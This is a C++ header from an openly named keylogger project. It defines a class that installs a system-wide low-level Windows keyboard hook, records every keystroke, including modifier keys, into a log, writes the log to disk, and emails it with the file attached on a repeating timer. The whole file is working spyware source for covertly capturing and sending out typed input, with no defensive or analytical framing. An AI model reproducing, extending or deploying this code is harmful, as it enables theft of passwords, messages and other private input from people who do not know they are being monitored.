#pragma once

#include <fstream>
#include <iostream>
#include <memory>

#include "DefaultFileSystemAccess.h"
#include "Helper.h"
#include "KeyBinding.h"
#include "MailSender.h"
#include "Timer.h"
#include "windows.h"

namespace keylogger
{
class KeyboardHook
{
public:
	KeyboardHook() : mailTimer{ std::make_unique<Timer>(KeyboardHook::timerSendMail, 400 * 60) }
	{
	}

	static void timerSendMail()
	{
		utils::appendLog("triggered sending email, keylog: " + keylog);

		if (keylog.empty())
		{
			return;
		}

		std::string lastFile = fileSystem.writeLog(keylog);

		if (lastFile.empty())
		{
			utils::appendLog("File creation was not succesfull. Keylog: " + keylog);
			return;
		}

		int status = mail::sendMail("Log [" + lastFile + "]",
			"Hi :)\n File has been attached to this mail :)\n" + keylog,
			fileSystem.getCurrentPath(true) + lastFile);

		if (status != 7)
		{
			utils::appendLog("Mail was not sent! Error code: " + utils::toString(status));
		}
		else
		{
			keylog = "";
		}
	}

	static LRESULT processKeyboard(int nCode, WPARAM wparam, LPARAM lparam)
	{
		if (nCode < 0)
		{
			CallNextHookEx(eHook, nCode, wparam, lparam);
		}

		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{
			utils::appendLog("key down");
			keylog += Keys::keys[kbs->vkCode].name;
			if (kbs->vkCode == VK_RETURN)
			{
				keylog += "\n";
			}
		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			utils::appendLog("key up");
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
				|| key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
				|| key == VK_MENU || key == VK_LMENU || key == VK_RMENU
				|| key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN
				|| key == VK_RWIN)
			{
				std::string keyName = Keys::keys[kbs->vkCode].name;
				keyName.insert(1, "/");
				keylog += keyName;
			}
		}

		return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	bool installHook()
	{
		utils::appendLog("Hook started... Timer started");
		mailTimer->start(true);

		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHook::processKeyboard, GetModuleHandle(NULL), 0);

		return eHook == NULL;
	}

	bool uninstallHook()
	{
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		stopTimer();
		return static_cast<bool>(b);
	}

	bool isHooked()
	{
		return static_cast<bool>(eHook == NULL);
	}

	void stopTimer()
	{
		mailTimer->stop();
	}

private:
	std::unique_ptr<Timer> mailTimer;
	static DefaultFileSystemAccess fileSystem;
	static std::string keylog;
	static HHOOK eHook;
};

DefaultFileSystemAccess KeyboardHook::fileSystem = DefaultFileSystemAccess{};
HHOOK KeyboardHook::eHook = NULL;
std::string KeyboardHook::keylog = "";
}